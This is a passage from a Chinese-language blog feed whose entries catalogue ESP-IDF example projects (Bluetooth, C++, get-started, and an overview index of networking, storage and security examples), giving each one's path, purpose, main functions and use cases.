    <link href="/ESP32-examples/19.bluetooth(WIP)/"/>
    <url>/ESP32-examples/19.bluetooth(WIP)/</url>
    
    <content type="html"><![CDATA[<h2 id="19-bluetooth-目录"><a href="#19-bluetooth-目录" class="headerlink" title="19. bluetooth 目录"></a>19. bluetooth 目录</h2><h3 id="19-1-blufi-例程"><a href="#19-1-blufi-例程" class="headerlink" title="19.1 blufi 例程"></a>19.1 blufi 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>blufi</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\bluetooth\blufi</td></tr><tr><td><strong>核心功能说明</strong></td><td>实现了通过蓝牙通道配置Wi-Fi连接的功能。提供安全协议，用于向ESP32传递Wi-Fi配置和凭据。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>blufi_init()</code>：初始化Blufi功能<br>- <code>blufi_security_init()</code>：初始化Blufi安全机制<br>- Wi-Fi初始化和配置相关函数<br>- 蓝牙初始化和GATT服务相关函数</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 来自手机App的Wi-Fi SSID和密码<br>- 来自手机App的配置命令<br><br>输出：<br>- 蓝牙广播信息<br>- 配置状态反馈<br>- Wi-Fi连接结果</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 物联网设备的Wi-Fi配置<br>- 无屏幕设备的网络设置<br>- 智能家居设备的初始配置<br>- 需要安全传递Wi-Fi凭据的场景<br>- 作为蓝牙配置Wi-Fi功能的参考模板</td></tr></tbody></table><h3 id="19-2-a2dp-sink-例程（经典蓝牙）"><a href="#19-2-a2dp-sink-例程（经典蓝牙）" class="headerlink" title="19.2 a2dp_sink 例程（经典蓝牙）"></a>19.2 a2dp_sink 例程（经典蓝牙）</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>a2dp_sink</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\bluetooth\bluedroid\classic_bt\a2dp_sink</td></tr><tr><td><strong>核心功能说明</strong></td><td>实现了经典蓝牙的A2DP接收器功能，能够接收来自蓝牙音频源（如手机、电脑）的音频数据并播放。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>bt_app_av_init()</code>：初始化A2DP音频功能<br>- <code>bt_app_core_init()</code>：初始化蓝牙应用核心<br>- <code>bt_app_task_handler()</code>：处理蓝牙应用任务<br>- <code>bt_app_av_sink_cb()</code>：处理A2DP接收回调<br>- 音频播放相关函数</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 来自蓝牙音频源的音频数据流<br><br>输出：<br>- 解码后的音频输出<br>- 连接状态信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 蓝牙音箱开发<br>- 车载蓝牙音频系统<br>- 无线耳机接收器<br>- 学习经典蓝牙A2DP协议的实现<br>- 作为经典蓝牙音频应用的参考模板</td></tr></tbody></table><h3 id="19-3-esp-ble-mesh-例程"><a href="#19-3-esp-ble-mesh-例程" class="headerlink" title="19.3 esp_ble_mesh 例程"></a>19.3 esp_ble_mesh 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>esp_ble_mesh</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\bluetooth\esp_ble_mesh</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示了BLE Mesh网络的实现，包括配网器、开关模型服务器/客户端、传感器模型服务器/客户端等。支持设备配置、网络管理和数据传输。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>ble_mesh_init()</code>：初始化BLE Mesh栈<br>- <code>ble_mesh_provisioning_init()</code>：初始化配网功能<br>- 各种Mesh模型相关函数<br>- 事件处理回调函数</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 配网器的配置命令<br>- 客户端的控制命令<br><br>输出：<br>- Mesh网络状态信息<br>- 传感器数据<br>- 设备状态响应</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 大规模物联网设备网络<br>- 智能家居自动化系统<br>- 工业自动化网络<br>- 智能照明系统<br>- 学习BLE Mesh协议的实现<br>- 作为BLE Mesh应用的参考模板</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——cxx</title>
    <link href="/ESP32-examples/03.cxx/"/>
    <url>/ESP32-examples/03.cxx/</url>
    
    <content type="html"><![CDATA[<h2 id="3-cxx-目录"><a href="#3-cxx-目录" class="headerlink" title="3. cxx 目录"></a>3. cxx 目录</h2><h3 id="3-1-exceptions-例程"><a href="#3-1-exceptions-例程" class="headerlink" title="3.1 exceptions 例程"></a>3.1 exceptions 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>exceptions</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\cxx\exceptions</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示ESP-IDF中C++异常处理功能。通过一个简单的类展示了构造函数中抛出异常的情况，以及如何使用try-catch块捕获和处理异常。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>cout</code>：标准输出流<br>- <code>runtime_error</code>：标准异常类<br>- <code>throw</code>：抛出异常<br>- <code>try-catch</code>：异常捕获和处理</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>无外部输入参数。输出包括：<br>- 构造函数调用信息<br>- 析构函数调用信息<br>- 捕获到的异常信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习ESP-IDF中C++异常处理的配置和使用<br>- 了解异常处理对程序结构的影响<br>- 验证开发环境对C++异常的支持<br>- 作为C++项目中异常处理的参考模板</td></tr></tbody></table><h3 id="3-2-pthread-例程"><a href="#3-2-pthread-例程" class="headerlink" title="3.2 pthread 例程"></a>3.2 pthread 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>pthread</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\cxx\pthread</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示C++线程与ESP-pthread配置的结合使用。展示了如何设置线程名称、核心绑定、栈大小和优先级，并验证线程继承配置的效果。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>std::thread</code>：C++线程类<br>- <code>std::this_thread::sleep_for</code>：线程睡眠<br>- <code>esp_pthread_get_default_config()</code>：获取默认线程配置<br>- <code>esp_pthread_set_cfg()</code>：设置线程配置<br>- <code>xPortGetCoreID()</code>：获取当前核心ID<br>- <code>uxTaskPriorityGet()</code>：获取任务优先级<br>- <code>uxTaskGetStackHighWaterMark()</code>：获取栈高水位线<br>- <code>pcTaskGetName()</code>：获取任务名称</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>无外部输入参数。输出包括：<br>- 各个线程的核心ID、优先级和最小可用栈大小<br>- 线程配置继承效果的验证信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习ESP-IDF中C++线程的配置和使用<br>- 了解如何优化线程性能（核心绑定、栈大小调整）<br>- 验证多线程应用的线程配置效果<br>- 作为C++多线程项目的参考模板</td></tr></tbody></table><h3 id="3-3-rtti-例程"><a href="#3-3-rtti-例程" class="headerlink" title="3.3 rtti 例程"></a>3.3 rtti 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>rtti</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\cxx\rtti</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示C++运行时类型信息（RTTI）功能。展示了如何使用typeid获取对象类型信息，以及如何使用dynamic_cast进行安全的向下类型转换。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>typeid()</code>：获取对象类型信息<br>- <code>dynamic_cast()</code>：安全的向下类型转换<br>- <code>cxxabi::__cxa_demangle()</code>：类型名称解混淆<br>- <code>std::rand()</code>：生成随机数<br>- <code>std::vector</code>：动态数组容器<br>- <code>std::generate()</code>：生成容器元素</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>无外部输入参数。输出包括：<br>- 各种对象和函数的类型名称<br>- 随机生成对象的类型信息<br>- dynamic_cast转换结果验证</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习ESP-IDF中C++ RTTI的配置和使用<br>- 了解如何在运行时识别对象类型<br>- 学习安全的向下类型转换方法<br>- 作为C++多态应用的参考模板</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——get-started</title>
    <link href="/ESP32-examples/01.get_started/"/>
    <url>/ESP32-examples/01.get_started/</url>
    
    <content type="html"><![CDATA[<h2 id="get-started-目录"><a href="#get-started-目录" class="headerlink" title="get-started 目录"></a>get-started 目录</h2><h3 id="1-1-hello-world-例程"><a href="#1-1-hello-world-例程" class="headerlink" title="1.1 hello_world 例程"></a>1.1 hello_world 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>hello_world</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\get-started\hello_world</td></tr><tr><td><strong>核心功能说明</strong></td><td>最简单的ESP-IDF示例，用于验证开发环境搭建和芯片基本功能。程序启动后打印”Hello world!”，显示芯片信息，并在10秒后重启。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>printf()</code>：标准输出<br>- <code>esp_chip_info()</code>：获取芯片信息<br>- <code>esp_flash_get_size()</code>：获取Flash大小<br>- <code>esp_get_minimum_free_heap_size()</code>：获取最小可用堆内存<br>- <code>vTaskDelay()</code>：FreeRTOS任务延迟<br>- <code>esp_restart()</code>：重启设备</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>无外部输入参数。输出包括：<br>- “Hello world!”字符串<br>- 芯片类型、CPU核心数、功能特性<br>- 硅片版本<br>- Flash大小和类型<br>- 最小可用堆内存<br>- 重启倒计时信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 验证ESP-IDF开发环境是否正确搭建<br>- 测试开发板是否正常工作<br>- 作为新项目的基础模板<br>- 学习ESP-IDF程序结构和基本API使用</td></tr></tbody></table><h3 id="1-2-blink-例程"><a href="#1-2-blink-例程" class="headerlink" title="1.2 blink 例程"></a>1.2 blink 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>blink</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\get-started\blink</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何控制LED闪烁，支持普通GPIO LED和可寻址LED（如WS2812）。通过配置可以选择LED类型、GPIO引脚和闪烁周期。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>gpio_reset_pin()</code>：重置GPIO引脚<br>- <code>gpio_set_direction()</code>：设置GPIO方向<br>- <code>gpio_set_level()</code>：设置GPIO电平<br>- <code>led_strip_new_rmt_device()</code>/<code>led_strip_new_spi_device()</code>：初始化LED灯带<br>- <code>led_strip_set_pixel()</code>：设置LED像素颜色<br>- <code>led_strip_refresh()</code>：刷新LED灯带<br>- <code>led_strip_clear()</code>：清除所有LED<br>- <code>vTaskDelay()</code>：FreeRTOS任务延迟</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>配置参数（通过menuconfig设置）：<br>- <code>CONFIG_BLINK_GPIO</code>：LED连接的GPIO引脚<br>- <code>CONFIG_BLINK_PERIOD</code>：闪烁周期（毫秒）<br>- <code>CONFIG_BLINK_LED_TYPE</code>：LED类型（GPIO或LED strip）<br>- <code>CONFIG_BLINK_LED_STRIP_BACKEND</code>：LED灯带后端（RMT或SPI）<br><br>输出：<br>- LED按设定周期闪烁<br>- 串口日志显示LED状态变化</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习GPIO基本操作<br>- 了解LED灯带控制<br>- 学习RMT和SPI外设使用<br>- 作为简单状态指示的基础模板<br>- 测试开发板LED功能</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程分析</title>
    <link href="/ESP32-examples/00.overview/"/>
    <url>/ESP32-examples/00.overview/</url>
    
    <content type="html"><![CDATA[<h1 id="ESP-IDF-例程分析总览"><a href="#ESP-IDF-例程分析总览" class="headerlink" title="ESP-IDF 例程分析总览"></a>ESP-IDF 例程分析总览</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>本文档汇总了ESP-IDF examples目录下各例程的分析结果，为开发团队提供快速查阅和参考。基于esp-idf 5.5.2例程总结。</p><h2 id="2-例程分类与汇总"><a href="#2-例程分类与汇总" class="headerlink" title="2. 例程分类与汇总"></a>2. 例程分类与汇总</h2><h3 id="get-started"><a href="#get-started" class="headerlink" title="get-started"></a>get-started</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>hello_world</td><td>验证开发环境，显示芯片信息</td><td><a href="/ESP32-examples/01.get_started#1-1-hello-world-例程">01.get_started &gt; 1.1 hello_world 例程</a></td></tr><tr><td>blink</td><td>控制LED闪烁，支持普通GPIO和可寻址LED</td><td><a href="/ESP32-examples/01.get_started#1-2-blink-例程">01.get_started &gt; 1.2 blink 例程</a></td></tr></tbody></table><h3 id="lowpower"><a href="#lowpower" class="headerlink" title="lowpower"></a>lowpower</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>vbat</td><td>演示ESP芯片在深度睡眠期间使用备用电池（VBAT）的功能</td><td><a href="/ESP32-examples/02.lowpower#2-1-vbat">02.lowpower &gt; 2.1 vbat</a></td></tr></tbody></table><h3 id="cxx"><a href="#cxx" class="headerlink" title="cxx"></a>cxx</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>exceptions</td><td>演示C++异常处理功能</td><td><a href="/ESP32-examples/03.cxx#3-1-exceptions-例程">03.cxx &gt; 3.1 exceptions 例程</a></td></tr><tr><td>pthread</td><td>演示C++线程与ESP-pthread配置的结合使用</td><td><a href="/ESP32-examples/03.cxx#3-2-pthread-例程">03.cxx &gt; 3.2 pthread 例程</a></td></tr><tr><td>rtti</td><td>演示C++运行时类型信息（RTTI）功能</td><td><a href="/ESP32-examples/03.cxx#3-3-rtti-例程">03.cxx &gt; 3.3 rtti 例程</a></td></tr></tbody></table><h3 id="custom-bootloader"><a href="#custom-bootloader" class="headerlink" title="custom_bootloader"></a>custom_bootloader</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>bootloader_hooks</td><td>向第二阶段引导加载程序添加钩子函数</td><td><a href="/ESP32-examples/04.custom_bootloader#4-1-bootloader-hooks">04.custom_bootloader &gt; 4.1 bootloader_hooks</a></td></tr><tr><td>bootloader_override</td><td>完全覆盖ESP-IDF的第二阶段引导加载程序</td><td><a href="/ESP32-examples/04.custom_bootloader#4-2-bootloader-override">04.custom_bootloader &gt; 4.2 bootloader_override</a></td></tr><tr><td>bootloader_multiboot</td><td>创建多引导加载程序，允许用户选择要运行的应用程序</td><td><a href="/ESP32-examples/04.custom_bootloader#4-3-bootloader-multiboot">04.custom_bootloader &gt; 4.3 bootloader_multiboot</a></td></tr><tr><td>bootloader_extra_dir</td><td>向引导加载程序构建添加自定义组件目录</td><td><a href="/ESP32-examples/04.custom_bootloader#4-4-bootloader-extra-dir">04.custom_bootloader &gt; 4.4 bootloader_extra_dir</a></td></tr></tbody></table><h3 id="provisioning"><a href="#provisioning" class="headerlink" title="provisioning"></a>provisioning</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>wifi_prov_mgr</td><td>使用wifi_provisioning管理器组件构建配网应用，支持BLE和SoftAP两种传输方式</td><td><a href="/ESP32-examples/05.provisioning#5-1-wifi-prov-mgr">05.provisioning &gt; 5.1 wifi_prov_mgr</a></td></tr></tbody></table><h3 id="build-system"><a href="#build-system" class="headerlink" title="build_system"></a>build_system</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>wrappers</td><td>使用链接器包装器重新定义IDF函数</td><td><a href="/ESP32-examples/06.build_system#6-1-wrappers">06.build_system &gt; 6.1 wrappers</a></td></tr></tbody></table><h3 id="phy"><a href="#phy" class="headerlink" title="phy"></a>phy</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>antenna</td><td>演示Wi-Fi天线软切换功能</td><td><a href="/ESP32-examples/07.phy#7-1-antenna">07.phy &gt; 7.1 antenna</a></td></tr><tr><td>cert_test</td><td>提供Wi-Fi和Bluetooth认证测试功能</td><td><a href="/ESP32-examples/07.phy#7-2-cert-test">07.phy &gt; 7.2 cert_test</a></td></tr></tbody></table><h3 id="zigbee"><a href="#zigbee" class="headerlink" title="zigbee"></a>zigbee</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>Zigbee网关示例</td><td>构建Zigbee网关设备，连接Wi-Fi网络并通过UART与OT-RCP通信形成Zigbee网络</td><td><a href="/ESP32-examples/08.zigbee#8-2-详细分析">08.zigbee &gt; 8.2 详细分析</a></td></tr><tr><td>HA开/关灯泡示例</td><td>配置Zigbee终端设备，作为HA开/关灯泡，响应开关控制命令</td><td><a href="/ESP32-examples/08.zigbee#8-2-详细分析">08.zigbee &gt; 8.2 详细分析</a></td></tr><tr><td>HA开/关开关示例</td><td>配置Zigbee协调器，作为HA开/关开关，控制灯泡设备</td><td><a href="/ESP32-examples/08.zigbee#8-2-详细分析">08.zigbee &gt; 8.2 详细分析</a></td></tr></tbody></table><h3 id="ieee802154"><a href="#ieee802154" class="headerlink" title="ieee802154"></a>ieee802154</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>ieee802154_cli</td><td>提供IEEE802.15.4命令行界面，用于管理和调试网络</td><td><a href="/ESP32-examples/09.ieee802154#9-1-ieee802154-cli">09.ieee802154 &gt; 9.1 ieee802154_cli</a></td></tr></tbody></table><h3 id="mesh"><a href="#mesh" class="headerlink" title="mesh"></a>mesh</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>internal_communication</td><td>演示mesh网络设置、消息发送和接收，以及灯光控制应用</td><td><a href="/ESP32-examples/10.mesh#10-1-internal-communication">10.mesh &gt; 10.1 internal_communication</a></td></tr><tr><td>ip_internal_network</td><td>使用mesh创建支持IP的子网络，结合MQTT实现节点间通信</td><td><a href="/ESP32-examples/10.mesh#10-2-ip-internal-network">10.mesh &gt; 10.2 ip_internal_network</a></td></tr><tr><td>manual_networking</td><td>禁用ESP-MESH的自组织网络功能，手动为节点选择父节点</td><td><a href="/ESP32-examples/10.mesh#10-3-manual-networking">10.mesh &gt; 10.3 manual_networking</a></td></tr></tbody></table><h3 id="ethernet"><a href="#ethernet" class="headerlink" title="ethernet"></a>ethernet</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>basic</td><td>以太网驱动的基本使用方法，包括内部EMAC和SPI以太网模块</td><td><a href="/ESP32-examples/11.ethernet#11-1-basic">11.ethernet &gt; 11.1 basic</a></td></tr><tr><td>iperf</td><td>使用iperf协议测试以太网的吞吐量和带宽</td><td><a href="/ESP32-examples/11.ethernet#11-2-iperf">11.ethernet &gt; 11.2 iperf</a></td></tr><tr><td>ptp</td><td>使用PTP协议在以太网网络中实现高精度时间同步</td><td><a href="/ESP32-examples/11.ethernet#11-3-ptp">11.ethernet &gt; 11.3 ptp</a></td></tr></tbody></table><h3 id="wifi"><a href="#wifi" class="headerlink" title="wifi"></a>wifi</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>station</td><td>ESP32作为Wi-Fi客户端连接到外部AP</td><td><a href="/ESP32-examples/12.wifi(WIP)#12-1-station-例程">12.wifi(WIP) &gt; 12.1 station 例程</a></td></tr><tr><td>softAP</td><td>ESP32作为Wi-Fi接入点</td><td><a href="/ESP32-examples/12.wifi(WIP)#12-2-softAP-例程">12.wifi(WIP) &gt; 12.2 softAP 例程</a></td></tr><tr><td>espnow</td><td>实现设备间的无连接Wi-Fi通信</td><td><a href="/ESP32-examples/12.wifi(WIP)#12-3-espnow-例程">12.wifi(WIP) &gt; 12.3 espnow 例程</a></td></tr><tr><td>iperf</td><td>测试Wi-Fi网络吞吐量</td><td><a href="/ESP32-examples/12.wifi(WIP)#12-4-iperf-例程">12.wifi(WIP) &gt; 12.4 iperf 例程</a></td></tr><tr><td>smart_config</td><td>通过手机应用配置Wi-Fi连接</td><td><a href="/ESP32-examples/12.wifi(WIP)#12-5-smart-config-例程">12.wifi(WIP) &gt; 12.5 smart_config 例程</a></td></tr></tbody></table><h3 id="openthread"><a href="#openthread" class="headerlink" title="openthread"></a>openthread</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>ot_cli</td><td>提供OpenThread命令行界面，用于管理和调试Thread网络</td><td><a href="/ESP32-examples/13.openthread(WIP)#13-1-ot-cli">13.openthread(WIP) &gt; 13.1 ot_cli</a></td></tr><tr><td>ot_rcp</td><td>实现OpenThread无线电协处理器，与主机配合工作</td><td><a href="/ESP32-examples/13.openthread(WIP)#13-2-ot-rcp">13.openthread(WIP) &gt; 13.2 ot_rcp</a></td></tr><tr><td>ot_br</td><td>实现OpenThread边界路由器，连接Thread网络和Wi-Fi/Ethernet网络</td><td><a href="/ESP32-examples/13.openthread(WIP)#13-3-ot-br">13.openthread(WIP) &gt; 13.3 ot_br</a></td></tr><tr><td>ot_sleepy_device</td><td>演示OpenThread休眠设备的实现，支持802.15.4无线电休眠</td><td><a href="/ESP32-examples/13.openthread(WIP)#13-4-ot-sleepy-device">13.openthread(WIP) &gt; 13.4 ot_sleepy_device</a></td></tr><tr><td>ot_trel**(WIP)**</td><td>演示OpenThread Transparent Reliable Exchange Layer (TREL)功能</td><td><a href="/ESP32-examples/13.openthread(WIP)#13-5-ot-trel">13.openthread(WIP) &gt; 13.5 ot_trel</a></td></tr></tbody></table><h3 id="storage"><a href="#storage" class="headerlink" title="storage"></a>storage</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>nvs/nvs_rw_value</td><td>使用NVS读写键值对数据</td><td><a href="/ESP32-examples/14.storage(WIP)#14-1-nvs-nvs-rw-value-例程">14.storage(WIP) &gt; 14.1 nvs/nvs_rw_value 例程</a></td></tr><tr><td>fatfs/getting_started</td><td>在SPI Flash上实现FAT文件系统</td><td><a href="/ESP32-examples/14.storage(WIP)#14-2-fatfs-getting-started-例程">14.storage(WIP) &gt; 14.2 fatfs/getting_started 例程</a></td></tr><tr><td>littlefs</td><td>使用LittleFS文件系统</td><td><a href="/ESP32-examples/14.storage(WIP)#14-3-littlefs-例程">14.storage(WIP) &gt; 14.3 littlefs 例程</a></td></tr><tr><td>spiffs</td><td>使用SPIFFS文件系统</td><td><a href="/ESP32-examples/14.storage(WIP)#14-4-spiffs-例程">14.storage(WIP) &gt; 14.4 spiffs 例程</a></td></tr><tr><td>wear_levelling</td><td>实现Flash的磨损均衡</td><td><a href="/ESP32-examples/14.storage(WIP)#14-5-wear-levelling-例程">14.storage(WIP) &gt; 14.5 wear_levelling 例程</a></td></tr></tbody></table><h3 id="network"><a href="#network" class="headerlink" title="network"></a>network</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>bridge</td><td>使用LwIP IEEE 802.1D桥接功能连接多个网络接口</td><td><a href="/ESP32-examples/15.network#15-1-bridge">15.network &gt; 15.1 bridge</a></td></tr><tr><td>eth2ap</td><td>实现以太网和WiFi AP之间的数据包转发</td><td><a href="/ESP32-examples/15.network#15-2-eth2ap">15.network &gt; 15.2 eth2ap</a></td></tr><tr><td>simple_sniffer</td><td>捕获网络数据包并保存为pcap格式文件</td><td><a href="/ESP32-examples/15.network#15-3-simple-sniffer">15.network &gt; 15.3 simple_sniffer</a></td></tr><tr><td>sta2eth</td><td>将WiFi站连接转换为有线连接</td><td><a href="/ESP32-examples/15.network#15-4-sta2eth">15.network &gt; 15.4 sta2eth</a></td></tr><tr><td>vlan_support</td><td>在以太网接口上创建虚拟VLAN接口</td><td><a href="/ESP32-examples/15.network#15-5-vlan-support">15.network &gt; 15.5 vlan_support</a></td></tr></tbody></table><h3 id="protocols"><a href="#protocols" class="headerlink" title="protocols"></a>protocols</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>mqtt/tcp</td><td>使用ESP-MQTT库实现MQTT客户端，通过TCP连接到broker</td><td><a href="/ESP32-examples/16.protocols(WIP)#16-1-mqtt-tcp-例程">16.protocols(WIP) &gt; 16.1 mqtt/tcp 例程</a></td></tr><tr><td>http_request</td><td>使用POSIX socket API实现简单的HTTP请求</td><td><a href="/ESP32-examples/16.protocols(WIP)#16-2-http-request-例程">16.protocols(WIP) &gt; 16.2 http_request 例程</a></td></tr><tr><td>sockets/tcp_client</td><td>使用POSIX socket API实现TCP客户端</td><td><a href="/ESP32-examples/16.protocols(WIP)#16-3-sockets-tcp-client-例程">16.protocols(WIP) &gt; 16.3 sockets/tcp_client 例程</a></td></tr><tr><td>https_request</td><td>使用ESP-IDF的HTTPS客户端API实现安全的HTTP请求</td><td><a href="/ESP32-examples/16.protocols(WIP)#16-4-https-request-例程">16.protocols(WIP) &gt; 16.4 https_request 例程</a></td></tr><tr><td>modbus/serial/mb_slave</td><td>使用ESP-IDF的Modbus组件实现Modbus RTU从机</td><td><a href="/ESP32-examples/16.protocols(WIP)#16-5-modbus-serial-mb-slave-例程">16.protocols(WIP) &gt; 16.5 modbus/serial/mb_slave 例程</a></td></tr></tbody></table><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>console/basic</td><td>创建交互式命令行界面(CLI)</td><td><a href="/ESP32-examples/17.system(WIP)#17-1-console-basic-例程">17.system(WIP) &gt; 17.1 console/basic 例程</a></td></tr><tr><td>esp_timer</td><td>演示高精度定时器功能</td><td><a href="/ESP32-examples/17.system(WIP)#17-2-esp-timer-例程">17.system(WIP) &gt; 17.2 esp_timer 例程</a></td></tr><tr><td>deep_sleep</td><td>演示深度睡眠模式和各种唤醒源</td><td><a href="/ESP32-examples/17.system(WIP)#17-3-deep-sleep-例程">17.system(WIP) &gt; 17.3 deep_sleep 例程</a></td></tr><tr><td>pthread</td><td>演示POSIX线程的使用</td><td><a href="/ESP32-examples/17.system(WIP)#17-4-pthread-例程">17.system(WIP) &gt; 17.4 pthread 例程</a></td></tr><tr><td>ota/simple_ota_example</td><td>演示OTA(Over-The-Air)升级功能</td><td><a href="/ESP32-examples/17.system(WIP)#17-5-ota-simple-ota-example-例程">17.system(WIP) &gt; 17.5 ota/simple_ota_example 例程</a></td></tr></tbody></table><h3 id="security"><a href="#security" class="headerlink" title="security"></a>security</h3><table><thead><tr><th>例程名称</th><th>核心功能</th><th>详细文档路径</th></tr></thead><tbody><tr><td>flash_encryption</td><td>演示Flash加密功能，包括开发和发布模式</td><td><a href="/ESP32-examples/18.security#18-1-flash-encryption">18.security &gt; 18.1 flash_encryption</a></td></tr><tr><td>hmac_soft_jtag</td><td>演示使用HMAC外设安全地重新启用软件禁用的JTAG接口</td><td><a href="/ESP32-examples/18.security#18-2-hmac-soft-jtag">18.security &gt; 18.2 hmac_soft_jtag</a></td></tr><tr><td>nvs_encryption_hmac</td><td>演示使用基于HMAC的加密密钥保护方案进行NVS加密</td><td><a href="/ESP32-examples/18.security#18-3-nvs-encryption-hmac">18.security &gt; 18.3 nvs_encryption_hmac</a></td></tr><tr><td>security_features_app</td><td>演示如何同时启用多种安全功能，包括Secure Boot V2、Flash Encryption等</td><td><a href="/ESP32-examples/18.security#18-4-security-features-app">18.security &gt; 18.4 security_features_app</a></td></tr><tr><td>tee_basic</td><td>演示如何使用ESP-TEE框架在可信执行环境中执行安全服务</td><td><a href="/ESP32-examples/18.security#18-5-1-tee-basic">18.security &gt; 18.5.1 tee_basic</a></td></tr><tr><td>tee_attestation</td><td>演示如何使用ESP-TEE框架生成实体证明令牌</td><td><a href="/ESP32-examples/18.security#18-5-2-tee-attestation">18.security &gt; 18.5.2 tee_attestation</a></td></tr><tr><td>tee_secure_ota</td><td>演示如何使用ESP-TEE框架进行安全OTA更新</td><td><a 